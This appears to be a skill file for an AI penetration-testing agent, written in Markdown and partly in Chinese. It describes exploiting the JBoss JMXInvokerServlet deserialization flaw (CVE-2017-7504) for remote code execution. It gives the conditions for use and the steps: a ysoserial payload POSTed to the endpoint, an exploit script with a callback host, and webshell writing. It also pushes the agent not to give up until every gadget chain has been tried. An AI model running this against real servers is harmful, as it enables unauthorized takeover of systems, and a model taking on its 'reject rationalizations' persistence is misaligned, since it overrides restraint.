---
name: jboss-jmxinvoker-deserialization
description: Exploits JBoss JMXInvokerServlet deserialization RCE (CVE-2017-7504). Use when target runs JBoss AS 4.x with /invoker/ endpoints exposed.
skill_type: exploit
severity: critical
tags: [java, deserialization, jboss, cve-2017-7504, cve-2017-12149]
cve: [CVE-2017-7504, CVE-2017-12149]
---

# JBoss JMXInvokerServlet 反序列化 RCE

## Essential Principles

1. **JBoss AS 4.x 的 `/invoker/JMXInvokerServlet` 接受 Java 序列化对象，无需认证**
2. **ysoserial + JDK 8 生成 payload → POST 到端点 → 反序列化 RCE**
3. **响应中无命令输出**（盲执行），需回调或写文件确认

## When to Use

- 扫描器/指纹报告 JBoss AS 4.x ~ 6.x
- `/invoker/JMXInvokerServlet` 返回 200/500（说明端点存在）
- CVE-2017-7504 / CVE-2017-12149 命中
- 页面含 JBoss 特征（Welcome to JBoss、JMX Console 等）

## When NOT to Use

- WildFly 10+（架构不同，无 JMXInvokerServlet）
- 端点 404（不存在此漏洞）
- 已通过其他方式获得 shell

## Rationalizations to Reject

- "只试了 CommonsCollections1" → jboss_exploit.py 遍历多个 gadget chain，全部试完再放弃
- "没有回连就不行" → 可以尝试写文件/写 webshell 确认

## Quick Start
```bash
# 确认端点存在
curl -s -o /dev/null -w "%{http_code}" {ENDPOINT}/invoker/JMXInvokerServlet

# 回调检测利用
python3 {skill_dir}/scripts/jboss_exploit.py {ENDPOINT} --lhost {LHOST} --port 39877
```
